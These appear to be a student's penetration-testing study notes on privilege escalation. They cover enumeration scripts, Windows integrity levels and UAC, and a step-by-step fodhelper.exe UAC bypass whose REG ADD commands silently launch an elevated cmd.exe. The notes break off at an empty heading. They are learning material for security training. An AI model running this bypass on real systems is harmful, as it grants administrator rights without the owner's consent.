        * w `windows-privesc-check2.exe --dump -G` dumps info `-G` for groups 
            `-U` for users
            can be used on remote host, see `-h`
        * u `./unix-privesc-check` to see help 
            `grep "writable config" -A 8 output.txt`
                will search our results to see if any importatn files can be
                writtien by anyone except root. `-A 8` print 8 lines after
                search is found
        * both are just scripts so you can `pbcopy` it on kali and just make a
              new file on tgt mechine to get it on there.
    #windows privilege escalation examples
        #windows privs and integrity levels
            When a user authenticates, windows assignees then an object called 
                `access token` that effectively describes security context of
                user and user privileges. Objects are given an unique id called
                `secuirty identifier (SID)` which are generated and stored by
                `Windows Local Secuirty Authority`.
            Windows also uses `integrity mechanism` which assigns `integrity levels`
                to app processes and securable objects. From Vista and on there
                are 4 levels:
                    Sytem integrity process: SYSTEM rights
                    High integrity process: administrative rights
                    Med integrity: standard user rights
                    low: very restricted rights often used in sandboxed
                    processes
        #user account contorl (UAC)
            apps are forced to run in the context of non-administrative untill
                an admin authorizes elevated access
            credential prompt askes for admin creds to run an app and consent
                prompt just wants admin to confirm he wants to run as admin.
            when `admin` is logged in he has a 2 `access tokens` one `high` and
                one `med`
            in `cmd.exe` if we run `net user admin Ev!lpass` to try and change
                the password it will fail becuase `cmd.exe` runs on `med` level
            `powershell.exe Start-Process cmd.exe -Verb runAs`
                will get new `cmd.exe` ran as admin after consent popup
            `whoami /groups`
                will show the shells level as `Label`
            Now we could change the admin pass
        #user account control bypass
            https://hydrasky.com/network-security/vulnerabilities-and-exploits/uac-bypass-via-registry-hijacking-on-windows-10/
            ex. w10 lab build 1709 to silently bypass the UAC
            `C:\Windows\Sytem32\fodhelper.exe` runs as high integraty and
                manages lang changes in the OS. It interacts with regestry keys
                that can can be changed without admin privs
            `C:\Tools\privilege_escalation\SysinternalsSuite>sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe`
                will use `sigcheck.exe` to check the manfest `-m` of the
                program we see `<requestedPrivileges>` that the
                `level="requireAdministrator"` so it needs admin to run and
                `<autoElevate>true</autoElevate>` so it will elevate privs as
                needed without prompting the user with a consent popup.
            `C:\Tools\privilege_escalation\SysinternalsSuite>procmon.exe`
                to monitor and gather more info so rerun `fodhelper.exe` (our
                    tgt)
            `C:\Windows\System32\fodhelper.exe`
                then in `procmon.exe` click filter > filter > top left dropdown
                    > process name > fodhelper.exe > add > apply
                    filter will just show our fodhelper.exe. We know that it
                    can use registers to elevate privs so add another filter
                    `Operation` > `contains` > Reg
                    run `fodhelper.exe` again and you will only see `Reg`
                    results in `procmon.exe`
                We want to see if `fodhelper.exe` is trying to access
                    registries that do not exsist. If so and Reg permissions
                    allow it, we can tamper with the entries and interfere with
                    the high-integrity process.
            in `procmon.exe` add another filter for `Results` > `is` > NAME NOT FOUND
                we see that it does. We can only access hives that the current
                    user has read/write too which is `HKEY_CURRENT_USER(HKCU)`
                    filter > `Path` > `contains` > HKCU
                    filter > `Path` > `contains` > ms-settings\Shell\Open\command
                uncheck our `Result` filter becuase we want to see if our
                    program can access the `\command` path in another hive
                we see that when the result is NAME NOT FOUND for `HKCU` when accessing
                    the `\command` it then goes to the `HKEY_CLASSES_ROOT(HKCR)` 
                    have and access its successfully
            in cmd.exe run `regedit` to open the regestry editor
                search for the HKCR hive to besure its valid: `HKCR\ms-settings\Shell\Open\command`
                    which it is so google it to see that it opens a section of the
                    app protocal which launchs an exe when a particular URL is used
                    by a program (from `MSDN`)
                    https://docs.microsoft.com/en-us/windows/win32/shell/launch
                    https://docs.microsoft.com/en-us/archive/blogs/ieinternals/understanding-protocols
                since HKCU doesn't have a valid key we can try to add one
            in `cmd.exe`: `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`
                this will attempt to add the key where we had the NAME NOT
                    FOUND result
            readd the `Result` > `is` > NAME NOT FOUND to `procmon.exe`
            clear all results from `procmon.exe` with `Ctrl+X` or white square
                icon
            restart `fodhelper.exe`
                in `procmon.exe` we now see `HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute`
                    which is from our new key we made. Becuase we don't want
                    to highjack this through a COM object, we will make a
                    blank `DelegateExecute` entry and then `fodhelper` will
                    follow its specification form `MSDN` and will look for a
                    program to lauch in `Shell\Open\Command\Default` key entry
            in `cmd.exe`: `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`
                `REG ADD ... /v` for value name and `/t` for type
            in `procmon.exe` remove the NAME NOT FOUND filter and replace with
                SUCCESS and then restart `fodhelper.exe`. now we see in `Detail`
                    that our new key `REG_SZ` was ran and was successful but
                    becuase it had an empty value the next Reg was the
                    `HKCR\ms-settings\Shell\Open\Command`. This is becuase
                    `(Default)` for regestry keys is set to `null`. So if we
                    replace our empty key value we made with an `exe` it should
                    run.
            in `cmd.exe`: `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
                `/d` is the value we want to add and `/f` is add silently
            run `fodhelper.exe` again and a `cmd` will pop up as admin!!!
        #insecure file permissions: serviio
            
              
            
